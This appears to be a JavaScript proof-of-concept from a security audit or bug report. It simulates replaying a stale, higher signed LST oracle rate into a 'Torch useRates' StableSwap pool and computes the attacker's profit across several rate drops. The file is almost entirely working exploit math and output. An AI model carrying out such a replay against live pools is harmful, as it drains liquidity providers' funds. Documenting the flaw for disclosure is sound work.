'use strict';
// PoC: stale signed-rate replay on Torch useRates pool.
// Attacker replays an old (higher) signed LST rate within the 600s oracle window,
// after the LST's true value has dropped. Sells LST into pool at inflated valuation.

const PRECISION=10n**18n, A_PRECISION=100n, FEE_DENOMINATOR=10n**10n;
const N=2n;
const AMP=2000n;            // A=20
const FEE_NUM=4_000_000n;   // 0.04%
function muldiv(a,b,c){ return (a*b)/c; }

// indices: 0 = USD (pegged), 1 = LST (rate-bearing)
function xp(bal, rates){ return bal.map((b,i)=>muldiv(rates[i],b,PRECISION)); }

function get_d(_xp,amp){
  let sum=0n; for(const x of _xp) sum+=x; if(sum===0n) return 0n;
  let d=sum; const ann=amp*N;
  for(let it=0;it<255;it++){ let dp=d;
    for(let i=0;i<2;i++) dp=muldiv(dp,d,(_xp[i]*N));
    const prev=d;
    const num=muldiv(ann,sum,A_PRECISION)+dp*N;
    const den=muldiv(ann-A_PRECISION,d,A_PRECISION)+(N+1n)*dp;
    d=muldiv(num,d,den);
    if(d>prev){if(d-prev<=1n)return d;}else{if(prev-d<=1n)return d;}
  } throw 'D';
}
function get_y(i,j,x,_xp,amp){
  const d=get_d(_xp,amp); const ann=amp*N; let c=d,sum=0n,_x=0n;
  for(let k=0;k<2;k++){ if(k!==j){ _x=(k===i)?x:_xp[k]; sum+=_x; c=muldiv(c,d,(_x*N)); } }
  c=muldiv(c,d*A_PRECISION,(ann*N)); const b=sum+muldiv(d,A_PRECISION,ann);
  let y=d; for(let it=0;it<255;it++){ const p=y; y=(y*y+c)/(2n*y+b-d);
    if(y>p){if(y-p<=1n)return y;}else{if(p-y<=1n)return y;}} throw 'Y';
}
// swap amount_in of coin i -> coin j, with given rate vector
function swap(reserve, rates, i, j, amount_in){
  const _xp=xp(reserve,rates);
  const x=_xp[i]+muldiv(amount_in,rates[i],PRECISION);
  const y=get_y(i,j,x,_xp,AMP);
  let dy=_xp[j]-y-1n;
  const fee=muldiv(dy,FEE_NUM,FEE_DENOMINATOR);
  dy=muldiv(dy-fee,PRECISION,rates[j]);
  return dy;
}

const USD = (x)=> (Number(x)/1e18).toFixed(2);

// pool ~ balanced in USD terms: 500k USD, and LST amount worth ~500k at true rate
const R_signed = 1140468870399735068n;            // 1.1404688... scaled to 1e18 (real oracle value /1e12)
const reserveUSD = 500000n*PRECISION;
const reserveLST = muldiv(500000n*PRECISION, PRECISION, R_signed); // ~438k LST
const reserve=[reserveUSD, reserveLST];

console.log('Pool: USD', USD(reserve[0]), ' LST', USD(reserve[1]), '(@signed rate', (Number(R_signed)/1e18).toFixed(4),')');
console.log('Oracle window measured: ~600s. No on-chain replay/monotonic/deviation guard.\n');

const tradeLST = 50000n*PRECISION; // attacker sells 50k LST into pool

for(const dropPct of [0.5,1,2,5]){
  const R_true = R_signed - BigInt(Math.round(Number(R_signed)*dropPct/100));
  const ratesStale=[PRECISION, R_signed];  // attacker replays old (high) signed rate
  const ratesTrue =[PRECISION, R_true];    // honest current rate

  const outStale = swap(reserve, ratesStale, 1, 0, tradeLST); // LST->USD at inflated rate
  const outHonest= swap(reserve, ratesTrue,  1, 0, tradeLST); // what honest pool would pay

  const lstCostUSD = muldiv(tradeLST, R_true, PRECISION);     // attacker buys LST at TRUE value
  const profit = outStale - lstCostUSD;                        // USD out minus USD cost of LST

  console.log(`--- LST true rate drop ${dropPct}% (within 600s window) ---`);
  console.log(`  USD out (stale replay): ${USD(outStale)}   USD out (honest): ${USD(outHonest)}`);
  console.log(`  extraction vs honest pool: ${USD(outStale-outHonest)} USD`);
  console.log(`  attacker LST cost @true: ${USD(lstCostUSD)}  => net profit: ${USD(profit)} USD on 50k LST trade\n`);
}
